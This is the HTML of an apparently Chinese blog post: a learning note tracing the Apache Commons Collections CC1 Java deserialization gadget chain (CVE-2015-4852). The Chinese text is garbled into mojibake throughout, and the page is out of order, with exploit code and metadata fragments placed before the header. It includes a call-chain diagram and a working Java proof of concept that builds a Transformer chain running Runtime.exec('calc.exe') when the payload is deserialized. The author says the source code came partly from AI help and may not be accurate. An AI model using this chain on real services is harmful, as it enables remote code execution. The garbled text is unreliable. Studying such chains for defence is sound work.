ç¬¬å››æ­¥ï¼šåºåˆ—åŒ– payloadï¼ˆç”Ÿæˆæ”»å‡»è½½è·ï¼‰ // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(handler); // åºåˆ—åŒ–æ¶æ„å¯¹è±¡ oos.close(); byte[] payload = baos.toByteArray(); System.out.println(\"âœ… Payload å·²ç”Ÿæˆï¼Œå³å°†è¿›è¡Œååºåˆ—åŒ–ï¼ˆè§¦å‘å‘½ä»¤æ‰§è¡Œï¼‰...\"); // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” // ç¬¬äº”æ­¥ï¼šååºåˆ—åŒ–ï¼ˆæ¨¡æ‹Ÿæ¼æ´è§¦å‘ç‚¹ï¼‰ // åœ¨çœŸå®åœºæ™¯ä¸­ï¼Œè¿™ä¸€æ­¥ç”±å­˜åœ¨æ¼æ´çš„æœåŠ¡ç«¯æ‰§è¡Œ // â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ByteArrayInputStream bais = new ByteArrayInputStream(payload); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); // âš ï¸ å…³é”®è§¦å‘ç‚¹ï¼æ­¤å¤„ä¼šæ‰§è¡Œ calc.exe ois.close(); System.out.println(\"âœ… Done. å¦‚æœæ˜¯ Windows ç³»ç»Ÿï¼Œåº”å·²å¼¹å‡ºè®¡ç®—å™¨ã€‚\"); } } ğŸ“„æ¼æ´è§¦å‘å¤§è‡´æµç¨‹ æ„é€ ä¸€æ¡èƒ½æ‰§è¡Œå‘½ä»¤çš„ Transformer é“¾ã€‚ ç”¨ TransformedMap åŒ…è£…è¯¥é“¾ï¼Œä½¿å…¶åœ¨ value è¢«è®¿é—®æ—¶æ‰§è¡Œã€‚ å°† TransformedMap åµŒå…¥åˆ° AnnotationInvocationHandler ä¸­ã€‚ åºåˆ—åŒ–è¯¥ handlerã€‚ ååºåˆ—åŒ–æ—¶ï¼ŒJDK è‡ªåŠ¨è°ƒç”¨ entrySet() â†’ è§¦å‘ value è½¬æ¢ â†’ æ‰§è¡Œå‘½ä»¤ï¼ 3.2 AnnotationInvocationHandler å¯åºåˆ—åŒ–ç±»æºç  è¿™æ®µä»£ç çœŸå®å­˜åœ¨äº JDK 6ã€7ã€8u71 åŠæ›´æ—©ç‰ˆæœ¬ä¸­**ï¼ŒObject obj = ois.readObject(); // å…³é”®ï¼šå¼€å§‹ååºåˆ—åŒ–ï¼Œä¸Šé¢ä»£ç å·²ç»å†™å‡ºäº†æ¼æ´çš„è§¦å‘ä½ç½®\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // 1. å…ˆè¯»å–çˆ¶ç±»å’Œå­—æ®µçš„é»˜è®¤å€¼ AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch (IllegalArgumentException e) { memberValues = null; return; } // 2. è·å– memberValues çš„ entrySet Map mv = memberValues; Set","wordCount":"2559","inLanguage":"en","datePublished":"2025-11-13T19:00:00+08:20","dateModified":"2025-11-13T19:00:00+08:20","author":{"@type":"Person","name":"æ‚¨çš„å§“å"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://ljj1992.fun/posts/cc%E9%93%BE%E8%B7%9F%E8%B8%AA/"},"publisher":{"@type":"Organization","name":"starå¾çš„åšå®¢","logo":{"@type":"ImageObject","url":"http://ljj1992.fun/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://ljj1992.fun/ accesskey=h title="starå¾çš„åšå®¢ (Alt + H)">starå¾çš„åšå®¢</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://ljj1992.fun/ title=é¦–é¡µ><span>é¦–é¡µ</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://ljj1992.fun/>Home</a>&nbsp;Â»&nbsp;<a href=http://ljj1992.fun/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">CCé“¾è·Ÿè¸ª</h1><div class=post-meta><span title='2025-11-13 19:00:00 +0820 +0820'>November 13, 2025</span>&nbsp;Â·&nbsp;<span>æ‚¨çš„å§“å</span></div></header><div class=post-content><h1 id=ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ä»è¿™é‡Œå¼€å§‹>ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ï¼Œä»è¿™é‡Œå¼€å§‹&mldr;<a hidden class=anchor aria-hidden=true href=#ä½ çš„æ–‡ç« æ­£æ–‡å†…å®¹ä»è¿™é‡Œå¼€å§‹>#</a></h1><h3 id=å†™åœ¨å‰é¢ä¸€ä»½å…³äºcc1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®°><strong>å†™åœ¨å‰é¢ï¼šä¸€ä»½å…³äºCC1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®°</strong><a hidden class=anchor aria-hidden=true href=#å†™åœ¨å‰é¢ä¸€ä»½å…³äºcc1è°ƒç”¨é“¾çš„ä¸ªäººå­¦ä¹ ç¬”è®°>#</a></h3><p>åœ¨æ‚¨æ·±å…¥é˜…è¯»æœ¬æ–‡æ¡£ä¹‹å‰ï¼Œç¬”è€…å¸Œæœ›å…ˆåˆ†äº«å‡ ç‚¹è¯´æ˜ï¼š</p><p>è¦å®Œå…¨ç†è§£æœ¬æ–‡æ‰€å‰–æçš„è°ƒç”¨é“¾ï¼Œå»ºè®®æ‚¨å¯¹Javaä¸­çš„ä¸€äº›åŸºç¡€æ¦‚å¿µæœ‰ä¸€å®šäº†è§£ï¼Œä¾‹å¦‚ Map æ¥å£ã€æ³¨è§£ï¼ˆAnnotationï¼‰ã€åå°„ï¼ˆReflectionï¼‰ä»¥åŠ HashMap çš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚å°¤å…¶æ˜¯ï¼Œç†è§£ <strong>Map ç»“æ„ä¸Javaæ³¨è§£æœºåˆ¶å¦‚ä½•åœ¨æ­¤åœºæ™¯ä¸‹ååŒå·¥ä½œï¼Œå¹¶æœ€ç»ˆä¸ºä½•ä¼šæˆä¸ºè§¦å‘æ¼æ´çš„å…³é”®</strong>ï¼Œæ˜¯æŒæ¡æ•´ä¸ªæ”»å‡»é“¾çš„é‡ä¸­ä¹‹é‡ã€‚</p><p>æˆ‘æœ¬äººä¹Ÿæ²¡æœ‰ä»äº‹è¿‡Javaå¼€å‘ï¼Œè¯´å®è¯ä¹Ÿæ˜¯ä¸œä¸€æ¦”å¤´è¥¿ä¸€æ£’å­çš„å­¦ä¹ é›¶æ•£çŸ¥è¯†ï¼Œæœ¬æ–‡å¹¶éåŸåˆ›æ€§çš„æ¼æ´ç ”ç©¶ï¼Œå…¶å†…å®¹æ˜¯åœ¨å®‰å…¨é¢†åŸŸå‰è¾ˆä»¬ï¼ˆå¤§ç¥ï¼‰å·²ç»å®Œæ•´æ¢³ç†å‡ºæ”»å‡»é“¾çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¹¶å€ŸåŠ©AIè¾…åŠ©å­¦ä¹ å’Œåˆ†æ(æºç ä¸èƒ½ç¡®ä¿ç™¾åˆ†ç™¾çœŸå®ï¼Œä½†æ˜¯é€»è¾‘ç»è¿‡æˆ‘ç¡®è®¤åº”è¯¥æ²¡é—®é¢˜çš„)ï¼Œå°†æ•´ä¸ªè°ƒç”¨æµç¨‹ä¸€æ­¥æ­¥è·Ÿè¸ªä¸‹æ¥ï¼Œæ—¨åœ¨ç†æ¸…æ¯ä¸€ç¯èŠ‚çš„æ‰§è¡Œé€»è¾‘ä¸å†…åœ¨è”ç³»ã€‚</p><p>å› æ­¤ï¼Œè¿™æ›´åƒæ˜¯ä¸€ç¯‡è¯¦ç»†çš„å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè¿‡ç¨‹çš„è®°å½•ã€‚å¸Œæœ›èƒ½å¯¹åŒæ ·åœ¨å­¦ä¹ è·¯ä¸Šçš„æœ‹å‹ä»¬æœ‰æ‰€å¯å‘ï¼Œæ–‡ä¸­è‹¥æœ‰ä»»ä½•ç–æ¼æˆ–ä¸å½“ä¹‹å¤„ï¼Œä¹Ÿæ³è¯·å„ä½ä¸åèµæ•™ã€‚</p><h1 id=ä¸€æ ¸å¿ƒæ€æƒ³æ¦‚è¿°>ä¸€ã€æ ¸å¿ƒæ€æƒ³æ¦‚è¿°<a hidden class=anchor aria-hidden=true href=#ä¸€æ ¸å¿ƒæ€æƒ³æ¦‚è¿°>#</a></h1><p>&ldquo;âš ï¸ æœ¬æµ‹è¯•æ–¹æ¡ˆä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ç›®çš„ã€‚ä»»ä½•æœªç»æˆæƒçš„åˆ©ç”¨è¡Œä¸ºå‡è¿åæ³•å¾‹ï¼Œè¯·åŠ¡å¿…åœ¨æˆæƒçš„æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨ã€‚&rdquo;</p><p><strong>ç›®æ ‡</strong>ï¼šé€šè¿‡<code>AnnotationInvocationHandler</code>å’Œ<code>TransformedMap</code>æ„é€ æ¶æ„å¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘<code>Runtime.exec()</code>æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id=æ ¸å¿ƒé€»è¾‘><strong>âœï¸æ ¸å¿ƒé€»è¾‘</strong>ï¼š<a hidden class=anchor aria-hidden=true href=#æ ¸å¿ƒé€»è¾‘>#</a></h3><ol><li>æ”»å‡»è€…ä½¿ç”¨ <code>TransformedMap.decorate()</code> æ–¹æ³•ï¼Œå°†ä¸€ä¸ªåŒ…å«æ¶æ„ <code>ChainedTransformer</code> é“¾çš„ <code>valueTransformer</code> ç»‘å®šåˆ°ä¸€ä¸ªæ™®é€šçš„ <code>HashMap</code> ä¸Šï¼Œæ„é€ å‡ºå…·æœ‰è‡ªåŠ¨è½¬æ¢èƒ½åŠ›çš„æ¶æ„ <code>TransformedMap</code>ã€‚</li><li>è¯¥ <code>ChainedTransformer</code> é“¾è¢«ç²¾å¿ƒè®¾è®¡ä¸ºä¾æ¬¡æ‰§è¡Œï¼šè·å– <code>Runtime.class</code> â†’ åå°„è°ƒç”¨ <code>getRuntime()</code> â†’ è·å– <code>Runtime</code> å®ä¾‹ â†’ è°ƒç”¨ <code>exec("calc")</code>ï¼Œä»è€Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</li><li>æ”»å‡»è€…é€šè¿‡åå°„åˆ›å»º <code>AnnotationInvocationHandler</code> å®ä¾‹ï¼Œå¹¶å°†ä¸Šè¿°æ¶æ„ <code>TransformedMap</code> ä½œä¸ºå…¶ <code>memberValues</code> å­—æ®µçš„å€¼ï¼Œä½¿è¯¥ handler åœ¨è¯­ä¹‰ä¸Šâ€œçœ‹èµ·æ¥åƒâ€ä¸€ä¸ªåˆæ³•çš„æ³¨è§£ä»£ç†å¯¹è±¡ã€‚</li><li>æ”»å‡»è€…å°†æ•´ä¸ª <code>AnnotationInvocationHandler</code> å¯¹è±¡åºåˆ—åŒ–ï¼Œç”Ÿæˆå¯ä¼ è¾“çš„ payloadï¼Œå¹¶å‘é€ç»™å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç›®æ ‡æœåŠ¡ã€‚</li><li>ç›®æ ‡æœåŠ¡åœ¨ååºåˆ—åŒ–è¯¥ payload æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨ <code>AnnotationInvocationHandler.readObject()</code> æ–¹æ³•ï¼›è¯¥æ–¹æ³•ä¼šéå† <code>memberValues.entrySet()</code>ï¼Œå¹¶å¯¹æ¯ä¸ªæ¡ç›®è¿›è¡Œç±»å‹æ ¡éªŒã€‚</li><li>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<code>AnnotationInvocationHandler.readObject()</code>ä¼šéå†<code>memberValues</code>çš„é”®å€¼å¯¹ã€‚å½“å®ƒå°è¯•å°†<code>memberValues</code>ä¸­çš„å€¼è½¬æ¢ä¸ºæ³¨è§£å®šä¹‰çš„ç±»å‹æ—¶ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…ï¼ˆå¦‚<code>String</code>è¢«è½¬æ¢ä¸º<code>Integer</code>ï¼‰ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨<code>entry.setValue(newValue)</code>ï¼Œæ¥æ›´æ–°å€¼ï¼Œå³ä½¿æ–°æ—§å€¼ç›¸åŒã€‚è¿™ä¸ªåŠ¨ä½œæ°å¥½è§¦å‘äº†æˆ‘ä»¬é¢„è®¾çš„é™·é˜±ã€‚
ğŸ’¡ä¸æ‡‚çš„å¼ºçƒˆå»ºè®®å­¦ä¸‹Mapå’Œæ³¨è§£æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå…¶å®æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£è€¦ï¼Œæœ¬äººä¹Ÿæ˜¯Javaå°ç™½</li><li>è€Œ <code>TransformedMap</code> é‡å†™äº† <code>entrySet()</code>ï¼Œè¿”å›çš„æ˜¯è‡ªå®šä¹‰çš„ <code>EntrySetView</code>ï¼›å…¶è¿­ä»£å™¨ <code>TransformedMapEntryIterator</code> ä¼šå°†åŸå§‹ <code>Map.Entry</code> åŒ…è£…ä¸º <code>TransformedMapEntry</code>ï¼Œå¹¶åœ¨æ„é€ æ—¶ä¿å­˜å¯¹ <code>TransformedMap</code> è‡ªèº«ï¼ˆå³ <code>parent</code>ï¼‰çš„å¼•ç”¨ã€‚</li><li>å› æ­¤ï¼Œ<code>e.setValue(newValue)</code> å®é™…è°ƒç”¨çš„æ˜¯ <code>TransformedMapEntry.setValue()</code>ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨ <code>parent.checkSetValue(value)</code>ï¼Œè¿›è€Œè§¦å‘ <code>valueTransformer.transform(value)</code>ã€‚</li><li>æœ€ç»ˆï¼Œç»‘å®šåœ¨ <code>TransformedMap</code> ä¸­çš„ <code>ChainedTransformer</code> é“¾è¢«æ‰§è¡Œï¼Œå®Œæˆ <code>Runtime.getRuntime().exec("calc")</code> çš„è°ƒç”¨ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ã€‚</li></ol><h3 id=-æ¼æ´åŸç†å°ç»“>ğŸ“ æ¼æ´åŸç†"å°ç»“<a hidden class=anchor aria-hidden=true href=#-æ¼æ´åŸç†å°ç»“>#</a></h3><blockquote><p>&ldquo;æ¼æ´æœ¬è´¨ï¼šåˆ©ç”¨JDKååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹<code>AnnotationInvocationHandler</code>çš„å¤„ç†é€»è¾‘ï¼Œç»“åˆApache Commons Collectionsçš„<code>TransformedMap</code>çš„è‡ªåŠ¨è½¬æ¢ç‰¹æ€§ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚&rdquo;</p></blockquote><h3 id=æµ‹è¯•ç¯å¢ƒè¯´æ˜>ğŸ§ªæµ‹è¯•ç¯å¢ƒè¯´æ˜ï¼š<a hidden class=anchor aria-hidden=true href=#æµ‹è¯•ç¯å¢ƒè¯´æ˜>#</a></h3><ul><li><p>å»ºè®®åœ¨æµ‹è¯•æ–¹æ¡ˆå¼€å¤´æ˜ç¡®è¯´æ˜æµ‹è¯•ç¯å¢ƒè¦æ±‚ï¼š</p><blockquote><p>&ldquo;æµ‹è¯•ç¯å¢ƒè¦æ±‚ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼šWindows 10 / macOS 10.15 / Ubuntu 20.04</li><li>JDKç‰ˆæœ¬ï¼šJDK 8u66ï¼ˆæˆ–â‰¤8u71çš„ä»»æ„ç‰ˆæœ¬ï¼‰</li><li>ä¾èµ–åº“ï¼šcommons-collections-3.2.1.jar&rdquo;</li></ul></blockquote></li></ul><h1 id=äºŒå®Œæ•´è°ƒç”¨é“¾æµç¨‹å›¾>äºŒã€å®Œæ•´è°ƒç”¨é“¾æµç¨‹å›¾<a hidden class=anchor aria-hidden=true href=#äºŒå®Œæ•´è°ƒç”¨é“¾æµç¨‹å›¾>#</a></h1><pre tabindex=0><code>ois.readObject()
  â”‚
  â””â†’ sun.reflect.annotation.AnnotationInvocationHandler.readObject()
       â”‚
       â””â†’ éå† this.memberValues.entrySet()  // memberValues æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ TransformedMap
            â”‚
            â””â†’ for each Map.Entry&lt;String, Object&gt; entry:
                 â”‚
                 â””â†’ entry.setValue(newValue)  â† å› ç±»å‹æ ¡éªŒå¤±è´¥è§¦å‘è‡ªåŠ¨ setValueï¼ˆå³ä½¿ newValue == valueï¼‰
                      â”‚
                      â””â†’ org.apache.commons.collections.map.TransformedMap$TransformedMapEntry.setValue(Object)
                           â”‚
                           â””â†’ this.parent.checkSetValue(value)  â† parent = TransformedMap å®ä¾‹
                                â”‚
                                â””â†’ TransformedMap.checkSetValue(Object)
                                     â”‚
                                     â””â†’ this.valueTransformer.transform(value)  â† å³ ChainedTransformer
                                          â”‚
                                          â””â†’ org.apache.commons.collections.functors.ChainedTransformer.transform(Object)
                                               â”‚
                                               â”œâ†’ ConstantTransformer.transform(_) â†’ returns Runtime.class
                                               â”œâ†’ InvokerTransformer(&#34;getMethod&#34;, [&#34;getRuntime&#34;, []]).transform(Runtime.class)
                                               â”‚    â””â†’ Runtime.class.getMethod(&#34;getRuntime&#34;)
                                               â”œâ†’ InvokerTransformer(&#34;invoke&#34;, [null, []]).transform(Method)
                                               â”‚    â””â†’ Method.invoke(null) â†’ returns Runtime.getRuntime()
                                               â””â†’ InvokerTransformer(&#34;exec&#34;, [&#34;calc.exe&#34;]).transform(Runtime)
                                                    â””â†’ Runtime.exec(&#34;calc.exe&#34;) ğŸ’¥
</code></pre><h1 id=ä¸‰cc1-åˆ©ç”¨é“¾æ ¸å¿ƒç»„ä»¶è§£æ>ä¸‰ã€<strong>CC1 åˆ©ç”¨é“¾æ ¸å¿ƒç»„ä»¶è§£æ</strong><a hidden class=anchor aria-hidden=true href=#ä¸‰cc1-åˆ©ç”¨é“¾æ ¸å¿ƒç»„ä»¶è§£æ>#</a></h1><p>Apache Commons Collections æä¾›äº†â€œèƒ½åšä»€ä¹ˆâ€ï¼ˆæ‰§è¡Œä»»æ„æ–¹æ³•ï¼‰ï¼Œè€Œ AnnotationInvocationHandler å†³å®šäº†â€œä½•æ—¶åšâ€ï¼ˆåœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è§¦å‘ï¼‰</p><h2 id=31-apache-commons-collections-ååºåˆ—åŒ–æ¼æ´cc1åˆ©ç”¨ä»£ç è¯¦è§£>3.1 Apache Commons Collections ååºåˆ—åŒ–æ¼æ´ï¼ˆCC1ï¼‰åˆ©ç”¨ä»£ç è¯¦è§£<a hidden class=anchor aria-hidden=true href=#31-apache-commons-collections-ååºåˆ—åŒ–æ¼æ´cc1åˆ©ç”¨ä»£ç è¯¦è§£>#</a></h2><p><strong>èƒŒæ™¯è¯´æ˜</strong>ï¼šè¿™æ®µä»£ç æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨ Apache Commons Collections åº“ä¸­çš„ <code>TransformedMap</code> å’Œåå°„æœºåˆ¶ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆä¾‹å¦‚å¼¹å‡º Windows è®¡ç®—å™¨ <code>calc.exe</code>ï¼‰ã€‚è¿™æ˜¯ç»å…¸çš„ <strong>Java ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-4852ï¼‰</strong> çš„åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ï¼Œç§°ä¸º <strong>CommonsCollections1 (CC1)</strong> é“¾ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Apache Commons Collections 1 (CC1) ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ¼”ç¤º</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// âš ï¸ ä»…ç”¨äºå®‰å…¨ç ”ç©¶ä¸å­¦ä¹ ï¼è¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ä¾èµ–ï¼šcommons-collections:commons-collections:3.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.TransformedMap;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.annotation.Retention; <span style=color:#75715e>// JDK å†…ç½®æ³¨è§£ï¼Œä»…ä½œå ä½ä½¿ç”¨</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e> * æ¼æ´åŸç†ç®€è¿°ï¼š
</span></span></span><span style=display:flex><span><span style=color:#75715e> * åˆ©ç”¨ Apache Commons Collections ä¸­çš„ TransformedMap + AnnotationInvocationHandlerï¼Œ
</span></span></span><span style=display:flex><span><span style=color:#75715e> * åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘æ¶æ„ Transformer é“¾ï¼Œæœ€ç»ˆæ‰§è¡Œä»»æ„å‘½ä»¤ï¼ˆå¦‚ calc.exeï¼‰ã€‚
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC1_Exploit</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç¬¬ä¸€æ­¥ï¼šæ„é€ æ¶æ„çš„ Transformer é“¾ï¼ˆæ ¸å¿ƒæ”»å‡»è½½è·ï¼‰</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç›®æ ‡ï¼šæ‰§è¡Œ Runtime.getRuntime().exec(&#34;calc.exe&#34;)</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 1. è¿”å›å›ºå®šçš„ Runtime.class å¯¹è±¡</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 2. è°ƒç”¨ Runtime.class.getMethod(&#34;getRuntime&#34;, new Class[0])</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//    è·å– getRuntime() æ–¹æ³•çš„ Method å¯¹è±¡</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> InvokerTransformer(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;getMethod&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},      <span style=color:#75715e>// getMethod çš„å‚æ•°ç±»å‹</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>}       <span style=color:#75715e>// å®é™…å‚æ•°ï¼šæ–¹æ³•å + å‚æ•°ç±»å‹æ•°ç»„</span>
</span></span><span style=display:flex><span>            ),
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 3. è°ƒç”¨ Method.invoke(null, new Object[]{})</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//    æ‰§è¡Œé™æ€æ–¹æ³• getRuntime()ï¼Œè¿”å› Runtime å®ä¾‹</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> InvokerTransformer(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;invoke&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>, Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},     <span style=color:#75715e>// invoke çš„å‚æ•°ç±»å‹</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{}}             <span style=color:#75715e>// é™æ€æ–¹æ³•è°ƒç”¨ï¼Œreceiver ä¸º null</span>
</span></span><span style=display:flex><span>            ),
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 4. è°ƒç”¨ Runtime.exec(&#34;calc.exe&#34;)ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> InvokerTransformer(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;exec&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},                     <span style=color:#75715e>// exec çš„å‚æ•°ç±»å‹</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc.exe&#34;</span>}                       <span style=color:#75715e>// è¦æ‰§è¡Œçš„å‘½ä»¤</span>
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>
